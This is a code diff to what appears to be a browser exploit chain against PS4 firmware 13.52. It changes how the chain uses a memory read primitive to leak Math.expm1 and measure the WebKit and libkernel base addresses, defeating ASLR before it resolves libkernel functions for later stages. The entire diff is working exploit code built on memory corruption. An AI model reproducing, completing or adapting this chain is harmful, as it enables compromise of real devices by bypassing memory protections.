@@ -5,8 +5,9 @@ import { establishPrimitive } from "./core.mjs?v=10";
 import { installWindowP, pairStatus } from "./mem.mjs";
 import { int64 } from "./int64.mjs";
 import { offsetsFor } from "./ps4_13.52.mjs";
-import { resolveLibkernel1352, lkAligned, parseHexAddr }
-    from "./lk_boot_1352.mjs";
+import {
+    resolveLibkernel1352, lkAligned, parseHexAddr, measureBases1352,
+} from "./lk_boot_1352.mjs";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -122,7 +123,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26b";
+const CHAIN_BUILD = "plop-13.52-2026-03-26-poc-bases";
 
 (async function () {
     let p = null;
@@ -267,10 +268,18 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26b";
         }
         mark("PRIMITIVE-OK", "");
 
+        const meas = measureBases1352(p, off);
+        mark("MEASURE-13.52", meas.verdict + " " + meas.detail);
+        if (meas.measExpm1 && meas.measExpm1 !== off.wk_expm1_builtin) {
+            off = Object.assign({}, off, { wk_expm1_builtin: meas.measExpm1 });
+            mark("EXPM1-RVA-UPDATE", "seed=0x" + (off.wk_expm1_builtin >>> 0).toString(16)
+                + " live=0x" + meas.measExpm1.toString(16));
+        }
+
         const cell = p.leakval(Math.expm1);
-        const nativeFn = p.read8(p.read8(cell.add32(0x18))
+        const nativeFn = meas.nativeFn || p.read8(p.read8(cell.add32(0x18))
             .add32(off.wk_JSFunction_m_function));
-        let webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        let webkitBase = meas.webkit || nativeFn.sub32(off.wk_expm1_builtin);
         if (params.has("webkit")) {
             const forced = parseHexAddr(params.get("webkit"));
             if (forced) {
@@ -278,31 +287,46 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26b";
                 mark("BASES-OVERRIDE", "webkit=" + webkitBase + " (URL — ASLR rotates; prefer expm1 RVA)");
             }
         }
-        const lkRes = resolveLibkernel1352(p, webkitBase, off, {
-            fnPtrHex: params.get("lkfn") || params.get("lk"),
-        });
-        let libkernelBase = lkRes.ok ? lkRes.lk : null;
-        if (!lkRes.ok && params.has("lkbase")) {
+
+        let libkernelBase = meas.libkernel;
+        let lkVia = meas.libkernel ? "text-magic-walk" : "";
+        let lkErr = "";
+        if (!libkernelBase) {
+            const lkRes = resolveLibkernel1352(p, webkitBase, off, {
+                fnPtrHex: params.get("lkfn") || params.get("lk"),
+            });
+            libkernelBase = lkRes.ok ? lkRes.lk : null;
+            lkVia = lkRes.via || "";
+            lkErr = lkRes.error || "";
+        }
+        if (!libkernelBase && params.has("lkbase")) {
             const forcedLk = parseHexAddr(params.get("lkbase"));
             if (forcedLk && lkAligned(forcedLk)) {
                 libkernelBase = forcedLk;
+                lkVia = "url-lkbase";
                 mark("BASES-OVERRIDE", "libkernel=" + libkernelBase + " (URL lkbase — debug only)");
             }
         }
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
-            + (lkRes.via ? " via=" + lkRes.via : "")
-            + (lkRes.error ? " err=" + lkRes.error : ""));
+            + (meas.webkit ? " webkit=measured" : "")
+            + (meas.libkernel ? " libkernel=measured" : "")
+            + (lkVia ? " via=" + lkVia : "")
+            + (lkErr ? " err=" + lkErr : ""));
         const aligned = v => v && v.hi > 0 && lkAligned(v);
         if (!check("module-bases-0x4000-aligned",
             aligned(webkitBase) && aligned(libkernelBase), "")) return;
 
-        // __error in libkernel .text (13.52 k__error) — not WebKit IAT (+0x3cb8cc8).
+        let errImport = meas.errImport;
+        if (!errImport && webkitBase) {
+            const impRva = (typeof off.wk___imp___error === "number" && off.wk___imp___error > 0)
+                ? off.wk___imp___error : 0x3cb8cc8;
+            try { errImport = p.read8(webkitBase.add32(impRva)); } catch (_) { }
+        }
         let errorFn = null;
         if (libkernelBase && off.k__error)
             errorFn = libkernelBase.add32(off.k__error);
-        if (!errorFn && webkitBase && off.wk___imp___error) {
-            try { errorFn = p.read8(webkitBase.add32(off.wk___imp___error)); } catch (_) { }
-        }
+        if ((!errorFn || errorFn.hi === 0) && errImport && errImport.hi > 0)
+            errorFn = errImport;
         mark("ERRNO-FN", errorFn ? String(errorFn) : "MISSING");
 
         const G = {};
